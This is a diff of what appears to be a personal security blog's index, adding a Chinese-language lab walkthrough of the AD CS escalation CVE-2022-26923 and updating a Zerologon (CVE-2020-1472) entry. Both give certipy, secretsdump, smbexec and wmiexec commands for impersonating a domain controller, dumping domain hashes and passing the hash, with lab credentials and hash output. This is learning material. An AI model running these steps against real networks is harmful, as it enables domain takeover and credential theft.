@@ -4,9 +4,34 @@
   
   
   <entry>
+    <title>CVE-2022-26923 ADCS提权</title>
+    <link href="/2024/01/09/CVE-2022-26923/"/>
+    <url>/2024/01/09/CVE-2022-26923/</url>
+    
+    <content type="html"><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>根据此文章进行配置 ADCS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://zhuanlan.zhihu.com/p/526293326<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/2c6c05204ec8020f29dba154fe474581" alt="image.png"><br>安装完后进行配置<br><img src="https://cdn.nlark.com/yuque/0/2024/png/26429680/1704851082579-eb133206-9a3c-4c8b-b2fb-1332546368b7.png#averageHue=%23d6cec6&clientId=ub110e0c5-701f-4&from=paste&id=ud2ea3634&originHeight=922&originWidth=1362&originalType=url&ratio=2&rotation=0&showTitle=false&size=384360&status=done&style=none&taskId=ubf131b65-91d9-435e-bc7e-ae80325a964&title=" alt="image.png"><br>域控服务和域证书服务安装成功后，在服务管理器的仪表盘的工具菜单中选择 “Active Directory管理中心”，然后在 Users 分组下新建一个用户账号，输入密码和选择 “密码永不过期”，模拟加入域环境的普通用户账号。<br><img src="https://img.tucang.cc/api/image/show/b9c00f00a98f70154f50aaabc4d063ed" alt="image.png"><br>创建一个用户：<code>testacc/Cxk@123</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/26429680/1704851083026-bf8e53cc-3da0-487c-9a15-0f64eda09f2e.png#averageHue=%23f6f6f6&clientId=ub110e0c5-701f-4&from=paste&id=u2ec855e4&originHeight=788&originWidth=1154&originalType=url&ratio=2&rotation=0&showTitle=false&size=459196&status=done&style=none&taskId=u97a1233e-9b12-4d4f-bded-fd4acd004cd&title=" alt="image.png"><br>登陆一个域内机器<br>域内定位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certutil -config - -ping certutil -dump -v <br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/932bcbb8d7560915f20c0c94b42bab73" alt="image.png"><br>服务器: <code>DC01.ust4.fun</code> 颁发机构: <code>ust4-DC01-CA</code><br>域外定位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy find -u testacc@ust4.fun -p <span class="hljs-string">&#x27;Cxk@123&#x27;</span> -dc-ip 192.168.214.200 -scheme ldap -stdout<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/6323d54e864889cef56be92d89d33041" alt="image.png"></p><h2 id="创建机器用户"><a href="#创建机器用户" class="headerlink" title="创建机器用户"></a>创建机器用户</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy account create -u testacc@ust4.fun -p <span class="hljs-string">&#x27;Cxk@123&#x27;</span> -dc-ip 192.168.214.200 -user user1 -pass <span class="hljs-string">&#x27;Aa@123&#x27;</span> -dns <span class="hljs-string">&#x27;dc01.ust4.fun&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/03ed3c8bb25c6d88f509b07f657b8f57" alt="image.png"></p><h2 id="利用创建的机器账号申请-machine模板的证书"><a href="#利用创建的机器账号申请-machine模板的证书" class="headerlink" title="利用创建的机器账号申请 machine模板的证书"></a>利用创建的机器账号申请 machine模板的证书</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy req -u user1$ -p <span class="hljs-string">&#x27;Aa@123&#x27;</span> -template Machine -target 192.168.214.200 -ca ust4-DC01-CA -debug<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/00479bbed8ad1cfbe89e41bd54102988" alt="image.png"><br>获取域控的证书 <code>dc01.pfx</code><br><img src="https://img.tucang.cc/api/image/show/b0b97ad01588dbfaf528a5b0a0d11cea" alt="image.png"></p><h2 id="使用证书获取-HASH"><a href="#使用证书获取-HASH" class="headerlink" title="使用证书获取 HASH"></a>使用证书获取 HASH</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy auth -pfx dc01.pfx -dc-ip 192.168.214.200 -debug<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/6630abd4850d5f1b4ea717eedd16f41e" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] Got <span class="hljs-built_in">hash</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;dc01$@ust4.fun&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:c3391d36932d66ad79ffc2bc117c17fa<br></code></pre></td></tr></table></figure><h2 id="利用-HASH-进行横向"><a href="#利用-HASH-进行横向" class="headerlink" title="利用 HASH 进行横向"></a>利用 HASH 进行横向</h2><p>dcsync</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:c3391d36932d66ad79ffc2bc117c17fa ust4.fun/<span class="hljs-string">&#x27;dc02$&#x27;</span>@192.168.214.201<br></code></pre></td></tr></table></figure><p>横向到 <code>dc02@192.168.214.201</code><br><img src="https://img.tucang.cc/api/image/show/4c435976b1e324b372857dc722f750bd" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Administrator:500:aad3b435b51404eeaad3b435b51404ee:214114172ade9bb8d8feca6d765e0cf9:::<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/a2b2dd1b2aeb563ed5bb128be22a79ef" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python smbexec.py ust4.fun/administrator:Cxk@123@192.168.214.200<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/ab5494697ce6bd997c0be35f0e4def3e" alt="image.png"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Web</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>CVE-2020-1472 NetLogon 漏洞学习</title>
-    <link href="/2024/01/08/CVE-2020-1472(Netlogon)%20/"/>
-    <url>/2024/01/08/CVE-2020-1472(Netlogon)%20/</url>
+    <link href="/2024/01/08/CVE-2020-1472/"/>
+    <url>/2024/01/08/CVE-2020-1472/</url>
     
     <content type="html"><![CDATA[<h1 id="相关项目、EXP"><a href="#相关项目、EXP" class="headerlink" title="相关项目、EXP"></a>相关项目、EXP</h1><ul><li><a href="https://github.com/mstxq17/cve-2020-1472">https://github.com/mstxq17/cve-2020-1472</a></li></ul><p>安装依赖</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">python -m pip install -r requirement.<span class="hljs-property">txt</span><br></code></pre></td></tr></table></figure><p>检测漏洞</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">python zerologon_tester.<span class="hljs-property">py</span> <span class="hljs-variable constant_">DCNAME</span> <span class="hljs-variable constant_">DCIP</span><br></code></pre></td></tr></table></figure><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h2 id="检测漏洞"><a href="#检测漏洞" class="headerlink" title="检测漏洞"></a>检测漏洞</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python zerologon_tester.py dc01 192.168.214.200<br></code></pre></td></tr></table></figure><p>It may take a while due to the network stability</p><p><img src="https://img.tucang.cc/api/image/show/7b25e9eacd2704bfca7c7a724a367b16" alt="Image"></p><h2 id="EXP-指控机器账户"><a href="#EXP-指控机器账户" class="headerlink" title="EXP 指控机器账户"></a>EXP 指控机器账户</h2><p>先 dump 出结果做对比</p><p><img src="https://img.tucang.cc/api/image/show/a27bce50f8d0ef132ed5079a98de59db" alt="Image"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python cve-2020-1472-exploit.py dc01 192.168.214.200<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/5d904d6d57a97baf40242635630c3596" alt="Image"></p><p>看到 DC01 用户密码已被置空</p><p><img src="https://img.tucang.cc/api/image/show/5d44d689bf303e909a163c9e42e7ab1c" alt="Image"></p><p>查询验证</p><p><img src="https://img.tucang.cc/api/image/show/010ce6a8f584c5e7824dcce2a9ab9263" alt="Image"></p><h2 id="导出用户凭据"><a href="#导出用户凭据" class="headerlink" title="导出用户凭据"></a>导出用户凭据</h2><p>域控的机器账户可以使用 DCSync 导出域内所有用户凭据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python secretsdump.py ust4.fun/<span class="hljs-string">&#x27;DC01$&#x27;</span>@192.168.214.200 -no-pass<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/cb2bf7dfa7d3cec8aa8cdf190e6e6c34" alt="Image"></p><p>获得域管 Administrator 的 hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Administrator:500:aad3b435b51404eeaad3b435b51404ee:214114172ade9bb8d8feca6d765e0cf9:::<br></code></pre></td></tr></table></figure><h2 id="HASH-传递"><a href="#HASH-传递" class="headerlink" title="HASH 传递"></a>HASH 传递</h2><p>使用 wmiexec 进行 hash 传递，为了解决乱码使用 GBK 编码(-codec gbk)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:214114172ade9bb8d8feca6d765e0cf9 ust4.fun/Administrator@192.168.214.200 -codec gbk<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/2b625d5a596ad858c2ab66e3dc407a1f" alt="Image"></p>]]></content>
     
@@ -419,9 +444,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>PHP</tag>
       
@@ -448,9 +473,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -662,9 +687,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -689,9 +714,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -770,9 +795,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>Docker</tag>
       
@@ -799,9 +824,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
